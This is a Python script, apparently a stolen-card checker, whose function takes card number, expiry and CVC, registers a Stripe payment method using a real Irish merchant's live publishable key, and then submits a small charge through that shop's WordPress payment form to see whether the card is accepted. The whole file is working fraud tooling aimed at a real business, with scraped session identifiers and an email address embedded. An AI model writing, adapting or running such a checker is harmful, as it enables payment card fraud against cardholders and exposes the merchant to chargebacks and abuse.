import requests, re
import random

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()
    
    random_amount1 = random.randint(1, 4)
    random_amount2 = random.randint(1, 99)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&billing_details[name]=aung+soe&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=e2ce4c33-7de3-48dd-b522-a1ac38e63825314c5e&muid=bf2c766a-b940-4e24-b775-dbebaf0be6928f64f2&sid=efc12bd6-7a6f-41ca-8f40-56b8b07ff2bfe05c90&pasted_fields=number&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Fsheelindecor.ie&time_on_page=44472&client_attribution_metadata[client_session_id]=db224655-6fec-43b6-aba3-4500009424af&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51HdKVAJUohDFZIex4MybnIr4jv6iOjqqom3s1n4DGsENMShFQMdLLc7zqh8MDnJET1z0tDI7mqbrxoB4sI5hd67U00FmF2DK9C'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = response.json()['id']
    
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://sheelindecor.ie',
        'priority': 'u=1, i',
        'referer': 'https://sheelindecor.ie/pay-online/',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        # 'cookie': '_ga=GA1.1.1544420914.1766482149; _ga_0DFXD0GTF4=GS2.1.s1766482149$o1$g0$t1766482149$j60$l0$h0; cookielawinfo-checkbox-necessary=yes; __stripe_mid=bf2c766a-b940-4e24-b775-dbebaf0be6928f64f2; __stripe_sid=efc12bd6-7a6f-41ca-8f40-56b8b07ff2bfe05c90; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
    }
    
    data = {
        'action': 'wp_full_stripe_inline_payment_charge',
        'wpfs-form-name': 'default',
        'wpfs-form-get-parameters': '%7B%7D',
        'wpfs-custom-amount-unique': '0.5',
        'wpfs-billing-name': 'aow',
        'wpfs-billing-address-line-1': 'parkave',
        'wpfs-billing-address-line-2': '',
        'wpfs-billing-address-city': 'new york',
        'wpfs-billing-address-state': 'new york',
        'wpfs-billing-address-zip': '10080',
        'wpfs-billing-address-country': 'IE',
        'wpfs-card-holder-email': 'minthantshin.virus11@gmail.com',
        'wpfs-card-holder-name': 'aung soe',
        'wpfs-stripe-payment-method-id': f'{pm}',
    }
    
    response = requests.post('https://sheelindecor.ie/wp-admin/admin-ajax.php', headers=headers, data=data)
    
    result = response.json()['message']
    
    return result
